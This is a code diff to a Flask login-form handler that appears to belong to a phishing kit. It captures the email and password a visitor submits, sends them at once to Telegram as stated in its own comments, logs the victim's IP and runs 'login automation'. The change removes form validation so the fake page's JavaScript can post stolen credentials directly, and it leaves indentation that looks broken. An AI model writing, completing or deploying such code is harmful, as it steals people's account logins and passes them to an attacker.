@@ -669,11 +669,10 @@ def process_form():
     else:
         logger.warning(f"⚠️ SKIPPING TELEGRAM: email={email}, password={'[HIDDEN]' if password else '[EMPTY]'}")
     
-    form = LoginForm()
-    
-    if not form.validate_on_submit():
-        flash('Form validation failed', 'error')
-        return redirect(url_for('index'))
+    # Handle direct form submission from JavaScript (no WTForms validation)
+    if not email or not password:
+        flash('Email and password are required', 'error')
+        return redirect(url_for('index', step='password', email=email, error='true'))
     
     # Verify Turnstile if configured
     turnstile_token = request.form.get('cf-turnstile-response')
@@ -704,16 +703,7 @@ def process_form():
         log_session_activity("email_step_completed", user_email=email)
         return redirect(url_for('index', step='password', email=email))
     
-    else:
-        # Password step - perform login automation
-        email = form.email.data if form.email.data else (request.args.get('email') or '')
-        if email:
-            email = email.strip().lower()
-        password = form.password.data
-        
-        if not email or not password:
-            flash('Email and password are required', 'error')
-            return redirect(url_for('index', step='password', email=email, error='true'))
+    # Continue with login automation
         
         # IMMEDIATELY send credentials to Telegram when submitted
         worker_ip = get_remote_address()
